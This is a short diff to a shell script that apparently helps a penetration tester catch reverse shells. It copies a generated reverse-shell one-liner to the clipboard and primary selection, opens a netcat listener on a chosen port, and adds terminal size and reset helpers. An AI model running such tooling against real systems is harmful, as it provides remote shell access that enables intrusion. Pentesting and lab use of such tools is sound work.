@@ -36,14 +36,26 @@ function getReverseShell() {
 		cut -d'|' -f2-
 }
 
+function getRows(){
+	stty -a | head -n 1 | cut -d ';' -f 2 | cut -d ' ' -f 3
+}
+
+function getCols(){
+	stty -a | head -n 1 | cut -d ';' -f 3 | cut -d ' ' -f 3
+}
+
 function display() {
 	ip=$(getIP)
 	port=$(getPort)
 	reverseShell=$(getReverseShell $ip $port)
 
 	echo -n "$reverseShell" | /usr/bin/xclip -i -selection clipboard
+	echo -n "$reverseShell" | /usr/bin/xclip -i -selection primary
 
 	nc -lvnp $port
+	#Put the tty back to normal
+	# This is useful if I got a nice shell before
+	stty -raw echo
 }
 
 
